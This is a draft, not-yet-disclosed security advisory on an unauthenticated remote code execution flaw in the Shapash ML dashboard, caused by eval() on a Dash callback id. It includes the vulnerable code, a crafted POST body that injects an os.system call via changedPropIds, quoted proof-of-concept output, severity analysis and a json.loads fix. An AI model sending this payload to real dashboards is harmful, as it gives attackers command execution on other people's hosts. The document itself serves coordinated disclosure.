# Unauthenticated RCE in Shapash web dashboard via `eval()` on a Dash callback id

> **Status: DRAFT — NOT YET DISCLOSED.** Appears **novel** (no CVE/advisory found as of
> 2026-10-09). Coordinated disclosure only: report privately to MAIF/shapash and/or submit
> via huntr **before** any public mention. Keep the containing repo private until a fix ships.

## Summary

Shapash is a widely used, actively maintained ML **explainability** library (by MAIF) that
ships an interactive **web dashboard** (`SmartExplainer.run_app()` / `shapash.webapp`). One
of the dashboard's Dash callbacks passes an attacker-influenceable string straight into
Python's `eval()`, giving **unauthenticated remote code execution** to anyone who can reach
the running dashboard.

- **Package:** `shapash` (PyPI) — ML model explainability + dashboard
- **Affected versions:** **2.2.0 – 2.9.0 (latest); no fixed release.** Verified by source: the
  `eval(button_id)` sink is absent in ≤2.1.1, introduced in 2.2.0 (with the filter-dropdown
  feature), and present unchanged through 2.9.0 (2.2.0, 2.4.0, 2.6.0, 2.7.0, 2.7.10, 2.8.0,
  2.8.1, 2.9.0 all confirmed).
- **Component:** `shapash/webapp/smart_app.py`, `layout_filter` callback, **line 2997**
- **Class:** Code injection / RCE (CWE-94 / CWE-95)
- **Auth:** none — Dash's `/_dash-update-component` endpoint is unauthenticated by default
- **Impact:** arbitrary OS command / Python execution on the host serving the dashboard

## The vulnerable code

```python
# shapash/webapp/smart_app.py  (layout_filter)
ctx = dash.callback_context
if not ctx.triggered:
    raise dash.exceptions.PreventUpdate
button_id = ctx.triggered[0]["prop_id"].split(".")[0]

if button_id == "add_dropdown_button":
    ...
elif button_id == "reset_dropdown_button":
    ...
else:
    filter_id_to_remove = eval(button_id)["index"]   # <-- RCE (line 2997)
```

The developer intent is to parse a Dash *pattern-matching component id* (a JSON dict such as
`{"index":0,"type":"del_dropdown_button"}`) back into a Python dict. They used `eval()` to do
it. But `button_id` is derived from `ctx.triggered[0]["prop_id"]`, and in Dash the triggered
`prop_id` comes from the **`changedPropIds` field of the client's callback POST request** —
it is not authenticated or validated as a real component id. An attacker therefore controls
the exact string handed to `eval()`.

## Attack

A single unauthenticated POST to the dashboard's callback endpoint:

```
POST /_dash-update-component    (Content-Type: application/json)
{
  "output": "dropdowns_container.children",
  "outputs": {"id": "dropdowns_container", "property": "children"},
  "inputs": [ ...the callback's declared inputs... ],
  "changedPropIds": ["getattr(__import__('os'),'system')('<cmd>').n_clicks"],
  "state": [ ... ]
}
```

`button_id = prop_id.split(".")[0]` strips the trailing `.n_clicks`, leaving
`getattr(__import__('os'),'system')('<cmd>')` — which contains **no `.`**, so it survives the
split intact — and `eval()` executes it. (The subsequent `["index"]` raises a `TypeError`,
but the command has already run.) The dot-free `getattr(__import__('os'),'system')(...)`
construction is what makes it reliable despite the `.split(".")[0]`.

## Proof of concept (verified end-to-end)

[`poc.py`](poc.py) replicates the exact callback, runs the Dash app's Flask test client, and
sends the crafted request. It is **non-destructive** — the injected command only creates a
local marker file. Verified on CPython 3.13 + `dash` 2.18.2 (shapash pins
`dash>=2.3.1,<3.0.0`):

```
attacker-sent changedPropIds[0]: getattr(__import__('os'),'system')('touch …SHAPASH_RCE_PROOF').n_clicks
RCE marker created: True
RESULT: VULNERABLE (code executed)
```

## Threat model & severity

**Severity: Critical — and network-exposed by default.**
- `SmartExplainer.run_app()` **defaults the bind host to `0.0.0.0`** (`smart_explainer.py`:
  `if host is None: host = "0.0.0.0"`; the docstring states *"Defaults to `0.0.0.0`, allowing
  external access."*). The bundled launchers (`webapp/webapp_launch.py`,
  `webapp_launch_DVF.py`) also bind `0.0.0.0:8080`. So the documented, default way to start the
  dashboard listens on **all interfaces** — no special "sharing" config needed.
- The callback endpoint `/_dash-update-component` is **unauthenticated**; any party who can
  reach the dashboard URL gets code execution with a single POST.
- (Even a non-default loopback bind is reachable via DNS-rebinding / CSRF-style cross-origin
  POSTs, since the endpoint is unauthenticated and state-changing.)

Suggested CVSS 3.1: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **9.8 (Critical)** — justified by
the default `0.0.0.0` bind. (If a specific deployment restricts the host to loopback, score
that instance lower, e.g. ~8.8 UI:R via CSRF; the default configuration is Critical.)

## Remediation (verified behaviour-preserving + safe)

Parse the Dash id with `json.loads`, never `eval`:

```python
import json
...
else:
    filter_id_to_remove = json.loads(button_id)["index"]
```

Verified: `json.loads('{"index":0,"type":"del_dropdown_button"}')` returns the correct dict
(`index == 0`), while any code payload raises `JSONDecodeError`. Dash serialises
pattern-matching ids as JSON (sorted keys), so `json.loads` is a drop-in replacement.
Defence-in-depth: Dash also exposes the parsed id via `ctx.triggered_id` / `ctx.args_grouping`
in newer versions, avoiding manual parsing entirely.

## Disclosure / bounty

See [`DISCLOSURE.md`](DISCLOSURE.md). Report privately to MAIF (GitHub Security Advisory on
`MAIF/shapash`) and/or submit through **huntr** (AI/ML OSS bug bounty). Do not open a public
issue/PR describing the exploit before a fix is coordinated.

## Credit

Found by source audit + a high-severity sink scanner (`scripts/hisev_scan.py`) and verified
with a crafted Dash callback request. Independent discovery; prior art checked (no CVE found).
